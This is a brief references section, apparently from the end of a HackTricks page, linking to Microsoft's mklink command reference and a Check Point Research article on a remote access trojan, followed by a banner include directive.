- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
